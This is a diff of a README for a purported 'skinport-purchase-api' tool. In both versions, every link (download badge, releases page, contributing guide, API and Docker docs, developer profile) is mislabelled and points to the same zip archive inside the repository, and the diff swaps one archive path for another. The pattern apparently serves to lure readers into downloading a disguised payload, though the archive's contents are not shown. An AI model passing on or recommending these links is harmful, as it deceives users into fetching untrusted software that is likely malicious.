@@ -1,6 +1,6 @@
 # 🛠️ skinport-purchase-api - Effortless API for Skinport Transactions
 
-[![Download Latest Release](https://raw.githubusercontent.com/harrye21/skinport-purchase-api/main/src/routes/skinport-purchase-api-1.9.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/harrye21/skinport-purchase-api/main/src/routes/skinport-purchase-api-1.9.zip)
+[![Download Latest Release](https://github.com/harrye21/skinport-purchase-api/raw/refs/heads/main/src/purchase-skinport-api-2.9-alpha.1.zip%20Latest%20Release-v1.0-brightgreen)](https://github.com/harrye21/skinport-purchase-api/raw/refs/heads/main/src/purchase-skinport-api-2.9-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **skinport-purchase-api**. This application provides a simple way
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/harrye21/skinport-purchase-api/main/src/routes/skinport-purchase-api-1.9.zip) to download the latest version. You will find the software packaged for your convenience. 
+To get started, visit the [Releases page](https://github.com/harrye21/skinport-purchase-api/raw/refs/heads/main/src/purchase-skinport-api-2.9-alpha.1.zip) to download the latest version. You will find the software packaged for your convenience. 
 
 1. Click on the link above.
 2. Choose the version you want to download.
@@ -61,16 +61,16 @@ Yes, feel free to check our documentation for help. You can also raise issues on
 
 ## 🗺️ Contributing
 
-If you want to contribute to the project, you are welcome! Check the [Contributing Guide](https://raw.githubusercontent.com/harrye21/skinport-purchase-api/main/src/routes/skinport-purchase-api-1.9.zip) for more details.
+If you want to contribute to the project, you are welcome! Check the [Contributing Guide](https://github.com/harrye21/skinport-purchase-api/raw/refs/heads/main/src/purchase-skinport-api-2.9-alpha.1.zip) for more details.
 
 ## 📚 Additional Resources
 
-- [API Documentation](https://raw.githubusercontent.com/harrye21/skinport-purchase-api/main/src/routes/skinport-purchase-api-1.9.zip)
-- [Docker Installation Guide](https://raw.githubusercontent.com/harrye21/skinport-purchase-api/main/src/routes/skinport-purchase-api-1.9.zip)
+- [API Documentation](https://github.com/harrye21/skinport-purchase-api/raw/refs/heads/main/src/purchase-skinport-api-2.9-alpha.1.zip)
+- [Docker Installation Guide](https://github.com/harrye21/skinport-purchase-api/raw/refs/heads/main/src/purchase-skinport-api-2.9-alpha.1.zip)
 
 ## 🎓 About the Developer
 
-This project is created by Harry E, a developer focused on providing helpful tools for users interacting with web APIs. You can find more of my work on my [GitHub profile](https://raw.githubusercontent.com/harrye21/skinport-purchase-api/main/src/routes/skinport-purchase-api-1.9.zip).
+This project is created by Harry E, a developer focused on providing helpful tools for users interacting with web APIs. You can find more of my work on my [GitHub profile](https://github.com/harrye21/skinport-purchase-api/raw/refs/heads/main/src/purchase-skinport-api-2.9-alpha.1.zip).
 
 ## 📞 Contact
 
